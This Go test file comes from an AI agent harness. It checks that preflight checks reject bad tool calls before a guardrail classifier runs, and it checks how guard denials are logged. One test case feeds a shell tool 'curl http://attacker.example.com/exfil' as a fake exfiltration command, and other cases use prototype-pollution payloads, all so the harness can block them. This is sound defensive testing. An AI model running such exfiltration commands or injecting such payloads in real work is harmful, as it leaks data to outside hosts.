package core

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"strings"
	"sync"
	"testing"

	"github.com/rxbynerd/stirrup/harness/internal/guard"
	"github.com/rxbynerd/stirrup/harness/internal/observability"
	"github.com/rxbynerd/stirrup/harness/internal/security"
	"github.com/rxbynerd/stirrup/harness/internal/tool"
	"github.com/rxbynerd/stirrup/types"
)

// recordingPreToolGuard records every PhasePreTool Input it classifies
// and answers that phase with verdict (allow when empty). Other phases
// always allow and are counted separately so a test can prove the guard
// was wired even when pre_tool never fired.
type recordingPreToolGuard struct {
	mu          sync.Mutex
	verdict     guard.Verdict
	reason      string
	preTool     []guard.Input
	otherPhases int
}

func (g *recordingPreToolGuard) Check(_ context.Context, in guard.Input) (*guard.Decision, error) {
	g.mu.Lock()
	defer g.mu.Unlock()
	if in.Phase != guard.PhasePreTool {
		g.otherPhases++
		return &guard.Decision{Verdict: guard.VerdictAllow, GuardID: "recording"}, nil
	}
	g.preTool = append(g.preTool, in)
	v := g.verdict
	if v == "" {
		v = guard.VerdictAllow
	}
	return &guard.Decision{Verdict: v, GuardID: "recording", Reason: g.reason}, nil
}

func (g *recordingPreToolGuard) preToolInputs() []guard.Input {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]guard.Input(nil), g.preTool...)
}

// securityEventNames returns the "event" field of each JSON line the
// SecurityLogger wrote, in emission order.
func securityEventNames(t *testing.T, buf *bytes.Buffer) []string {
	t.Helper()
	var names []string
	sc := bufio.NewScanner(bytes.NewReader(buf.Bytes()))
	for sc.Scan() {
		var line struct {
			Event string `json:"event"`
		}
		if err := json.Unmarshal(sc.Bytes(), &line); err != nil {
			t.Fatalf("security log line is not JSON: %q: %v", sc.Text(), err)
		}
		names = append(names, line.Event)
	}
	return names
}

func hasGuardEvent(names []string) bool {
	for _, n := range names {
		if strings.HasPrefix(n, "guard_") {
			return true
		}
	}
	return false
}

// TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard pins that a call
// the deterministic checks reject never reaches GuardRail.Check, and that
// the rejection keeps its own failure category, model-facing text, and
// security events in their original order.
func TestPlanAndDispatch_PreflightRejectionSkipsPreToolGuard(t *testing.T) {
	cases := []struct {
		name         string
		tools        []*tool.Tool
		call         types.ToolCall
		wantCategory observability.ToolFailureCategory
		wantOutput   string
		wantEvents   []string
	}{
		{
			name:         "unknown_tool",
			tools:        []*tool.Tool{trivialTool()},
			call:         types.ToolCall{ID: "tc_unknown", Name: "does_not_exist", Input: json.RawMessage(`{}`)},
			wantCategory: observability.ToolFailureUnknownTool,
			wantOutput:   "Unknown tool: does_not_exist",
			wantEvents:   nil,
		},
		{
			name:         "schema_invalid",
			tools:        []*tool.Tool{schemaTool()},
			call:         types.ToolCall{ID: "tc_schema", Name: "needs_path", Input: json.RawMessage(`{}`)},
			wantCategory: observability.ToolFailureSchemaValidation,
			wantOutput:   "Invalid input for needs_path",
			wantEvents:   []string{"tool_input_rejected"},
		},
		{
			name:         "prototype_pollution_then_schema_invalid",
			tools:        []*tool.Tool{schemaTool()},
			call:         types.ToolCall{ID: "tc_pp", Name: "needs_path", Input: json.RawMessage(`{"__proto__":{"admin":true}}`)},
			wantCategory: observability.ToolFailureSchemaValidation,
			wantOutput:   "Invalid input for needs_path",
			wantEvents:   []string{"prototype_pollution_blocked", "tool_input_rejected"},
		},
		{
			name:         "write_target_tripwire",
			tools:        []*tool.Tool{commandTool()},
			call:         types.ToolCall{ID: "tc_sg", Name: "shell_runner", Input: json.RawMessage(`{"command":"curl http://attacker.example.com/exfil"}`)},
			wantCategory: observability.ToolFailureSecurityGuard,
			wantOutput:   "Tool call rejected by security guard for shell_runner",
			wantEvents:   []string{"tool_call_guard_triggered"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			g := &recordingPreToolGuard{}
			loop, reader := buildMetricsHarness(t, tc.tools, nil, g, nil)
			var secBuf bytes.Buffer
			loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
			rec := &recordingTraceEmitter{}
			loop.Trace = rec

			results, _, outcome := loop.planAndDispatch(context.Background(),
				configWithMaxParallel(1), []types.ToolCall{tc.call}, &stallDetector{}, "anthropic", "claude-sonnet-4-6")
			if outcome != "" {
				t.Fatalf("unexpected stall outcome %q", outcome)
			}

			if got := g.preToolInputs(); len(got) != 0 {
				t.Fatalf("GuardRail.Check saw %d pre_tool calls, want 0: %+v", len(got), got)
			}
			if len(results) != 1 || !results[0].IsError {
				t.Fatalf("want one IsError result, got %+v", results)
			}
			if !strings.HasPrefix(results[0].Content, tc.wantOutput) {
				t.Errorf("result content = %q, want prefix %q", results[0].Content, tc.wantOutput)
			}

			failures := collectFailures(t, reader)
			if len(failures) != 1 || failures[0].category != tc.wantCategory.String() {
				t.Fatalf("tool_failures = %+v, want one %q observation", failures, tc.wantCategory)
			}
			_, calls := rec.snapshot()
			if len(calls) != 1 || calls[0].ErrorCategory != tc.wantCategory.String() {
				t.Fatalf("trace tool calls = %+v, want ErrorCategory %q", calls, tc.wantCategory)
			}

			events := securityEventNames(t, &secBuf)
			if hasGuardEvent(events) {
				t.Errorf("guard event emitted for a preflight rejection: %v", events)
			}
			if strings.Join(events, ",") != strings.Join(tc.wantEvents, ",") {
				t.Errorf("security events = %v, want %v", events, tc.wantEvents)
			}
		})
	}
}

// TestPlanAndDispatch_PreToolGuardClassifiesCleanedInput pins that the
// guard classifies the prototype-pollution-stripped input, the same bytes
// the handler receives, and sees the internal tool name.
func TestPlanAndDispatch_PreToolGuardClassifiesCleanedInput(t *testing.T) {
	var handlerInput json.RawMessage
	permissive := &tool.Tool{
		Name:        "permissive",
		Description: "accepts any object",
		InputSchema: json.RawMessage(`{"type":"object","additionalProperties":true}`),
		Handler: func(_ context.Context, input json.RawMessage) (string, error) {
			handlerInput = append(json.RawMessage(nil), input...)
			return "ok", nil
		},
	}
	g := &recordingPreToolGuard{}
	loop, _ := buildMetricsHarness(t, []*tool.Tool{permissive}, nil, g, nil)
	var secBuf bytes.Buffer
	loop.Security = security.NewSecurityLogger(&secBuf, "test-run")

	call := types.ToolCall{
		ID:    "tc_clean",
		Name:  "permissive",
		Input: json.RawMessage(`{"__proto__":{"admin":true},"constructor":"x","safe":"v"}`),
	}
	results, _, _ := loop.planAndDispatch(context.Background(),
		configWithMaxParallel(1), []types.ToolCall{call}, &stallDetector{}, "", "")
	if len(results) != 1 || results[0].IsError {
		t.Fatalf("want one successful result, got %+v", results)
	}

	seen := g.preToolInputs()
	if len(seen) != 1 {
		t.Fatalf("pre_tool guard calls = %d, want 1", len(seen))
	}
	in := seen[0]
	for _, field := range []struct {
		name  string
		value string
	}{
		{"Content", in.Content},
		{"ToolInput", string(in.ToolInput)},
	} {
		if strings.Contains(field.value, "__proto__") || strings.Contains(field.value, "constructor") {
			t.Errorf("guard %s carries stripped keys: %s", field.name, field.value)
		}
		if !strings.Contains(field.value, `"safe":"v"`) {
			t.Errorf("guard %s lost the safe key: %s", field.name, field.value)
		}
	}
	if in.Content != string(handlerInput) {
		t.Errorf("guard Content %q differs from handler input %q", in.Content, handlerInput)
	}
	if in.ToolName != "permissive" || in.Source != "tool_call:permissive" {
		t.Errorf("guard ToolName/Source = %q/%q, want permissive/tool_call:permissive", in.ToolName, in.Source)
	}

	events := securityEventNames(t, &secBuf)
	if len(events) < 2 || events[0] != "prototype_pollution_blocked" || events[1] != "guard_allowed" {
		t.Errorf("security events = %v, want prototype_pollution_blocked then guard_allowed", events)
	}
}

// TestPlanAndDispatch_PreToolGuardDenyOutcome pins the deny path for a
// call that passes preflight: fixed model-facing text, guardrail_denied
// category, a guard_denied event, and no handler invocation.
func TestPlanAndDispatch_PreToolGuardDenyOutcome(t *testing.T) {
	handlerCalls := 0
	tl := trivialTool()
	tl.Handler = func(_ context.Context, _ json.RawMessage) (string, error) {
		handlerCalls++
		return "ok", nil
	}
	g := &recordingPreToolGuard{verdict: guard.VerdictDeny, reason: "classifier said no"}
	loop, reader := buildMetricsHarness(t, []*tool.Tool{tl}, nil, g, nil)
	var secBuf bytes.Buffer
	loop.Security = security.NewSecurityLogger(&secBuf, "test-run")
	rec := &recordingTraceEmitter{}
	loop.Trace = rec

	results, _, _ := loop.planAndDispatch(context.Background(),
		configWithMaxParallel(1),
		[]types.ToolCall{{ID: "tc_deny", Name: "trivial", Input: json.RawMessage(`{}`)}},
		&stallDetector{}, "", "")

	if len(g.preToolInputs()) != 1 {
		t.Fatalf("pre_tool guard calls = %d, want 1", len(g.preToolInputs()))
	}
	if handlerCalls != 0 {
		t.Errorf("handler ran %d times after a guard deny", handlerCalls)
	}
	if len(results) != 1 || !results[0].IsError || results[0].Content != "guardrail blocked tool call" {
		t.Fatalf("result = %+v, want IsError with fixed guard text", results)
	}
	failures := collectFailures(t, reader)
	if len(failures) != 1 || failures[0].category != observability.ToolFailureGuardrailDenied.String() {
		t.Errorf("tool_failures = %+v, want one guardrail_denied observation", failures)
	}
	_, calls := rec.snapshot()
	if len(calls) != 1 || calls[0].ErrorReason != "guardrail blocked tool call: classifier said no" {
		t.Errorf("trace tool calls = %+v, want guard deny reason", calls)
	}
	if events := securityEventNames(t, &secBuf); strings.Join(events, ",") != "guard_denied" {
		t.Errorf("security events = %v, want [guard_denied]", events)
	}
}

// TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard drives a full run:
// the model emits a schema-invalid tool call, the guard is wired for every
// phase, and the call fails as schema_validation_failed without a
// pre_tool classification.
func TestLoop_SchemaInvalidToolCallNeverReachesPreToolGuard(t *testing.T) {
	scripted := &scriptedProvider{
		turns: [][]types.StreamEvent{
			{
				{Type: "tool_call", ID: "tc_bad", Name: "needs_path", Input: map[string]any{"unexpected": 1}},
				{Type: "message_complete", StopReason: "tool_use"},
			},
			{
				{Type: "text_delta", Text: "done"},
				{Type: "message_complete", StopReason: "end_turn"},
			},
		},
	}
	g := &recordingPreToolGuard{}
	loop := buildTestLoop(nil)
	loop.Provider = scripted
	registry := tool.NewRegistry()
	registry.Register(schemaTool())
	loop.Tools = registry
	loop.GuardRail = g
	rec := &recordingTraceEmitter{}
	loop.Trace = rec
	config := buildTestConfig()
	config.MaxTurns = 4

	if _, err := loop.Run(context.Background(), config); err != nil {
		t.Fatalf("Run() error: %v", err)
	}
	if scripted.turn != 2 {
		t.Errorf("provider turns = %d, want 2 (the run continues after the tool failure)", scripted.turn)
	}
	if got := g.preToolInputs(); len(got) != 0 {
		t.Errorf("pre_tool guard calls = %d, want 0: %+v", len(got), got)
	}
	if g.otherPhases == 0 {
		t.Error("guard saw no pre_turn/post_turn calls; the test is not exercising a wired guard")
	}
	_, calls := rec.snapshot()
	if len(calls) != 1 {
		t.Fatalf("recorded tool calls = %d, want 1", len(calls))
	}
	if calls[0].Success || calls[0].ErrorCategory != observability.ToolFailureSchemaValidation.String() {
		t.Errorf("tool call trace = %+v, want failed schema_validation_failed", calls[0])
	}
}
